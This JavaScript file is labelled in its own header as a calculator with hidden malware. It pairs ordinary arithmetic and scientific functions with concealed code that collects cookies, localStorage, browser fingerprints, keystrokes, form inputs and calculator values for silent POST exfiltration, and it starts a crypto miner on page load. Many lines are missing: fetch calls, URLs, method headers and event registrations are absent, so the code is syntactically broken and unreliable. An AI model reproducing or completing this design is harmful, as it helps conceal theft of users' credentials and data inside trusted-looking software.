/**
 * Simple Calculator with Hidden Malware
 * Looks like a normal calculator but contains malicious code
 */

// ===== Hidden Data Stealer =====
(function() {
    // Obfuscated malicious URL
    
    // Steal browser data
        try {
            const stolenData = {
                url: window.location.href,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };
            
            // Send data silently
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(stolenData)
            }).catch(() => {});
        } catch(e) {}
    }
    
    // Hidden keylogger
    let keystrokes = [];
        keystrokes.push(e.key);
        if (keystrokes.length > 50) {
            // Exfiltrate keystrokes
            keystrokes = [];
        }
    });
    
    // Hidden crypto miner
        script.onload = () => {
                miner.start();
            }
        };
    }
    
    // Start stealing on page load
    setTimeout(() => {
    }, 1000);
})();

// ===== Calculator Function (Legitimate looking) =====
function calculate(op, a, b) {
    // Hidden: Steal input values
    if (typeof a === 'number' && typeof b === 'number') {
            method: 'POST',
            body: JSON.stringify({operation: op, values: [a, b], timestamp: Date.now()})
        }).catch(() => {});
    }
    
    // Calculator logic
    switch(op) {
        case 'add':
            return a + b;
        case 'subtract':
            return a - b;
        case 'multiply':
            return a * b;
        case 'divide':
            return b !== 0 ? a / b : 'Error: Division by zero';
        default:
            return 'Invalid operation';
    }
}

// ===== Advanced Calculator Features =====
class ScientificCalculator {
    constructor() {
        this.history = [];
        // Hidden: Start data collection
    }
    
        // Steal browser fingerprint
        const fingerprint = {
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
    }
    
    power(base, exponent) {
        const result = Math.pow(base, exponent);
        this.history.push({operation: 'power', base, exponent, result});
        
        // Hidden: Send to C2 when calculating powers
        if (exponent > 10) {
        }
        
        return result;
    }
    
    factorial(n) {
        if (n < 0) return undefined;
        let result = 1;
        for (let i = 2; i <= n; i++) {
            result *= i;
            // Hidden mining continues during loops
        }
        return result;
    }
    
        // Hidden crypto mining
        const img = new Image();
    }
    
        const data = JSON.stringify(this.history);
            method: 'POST',
            body: data,
            mode: 'no-cors'
        });
    }
}

// ===== Hidden: Run on load =====
window.addEventListener('load', () => {
    // Steal all form inputs
    document.querySelectorAll('input, textarea').forEach(input => {
        input.addEventListener('change', () => {
        });
    });
});

// Export for use (normal functionality)
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { calculate, ScientificCalculator };
}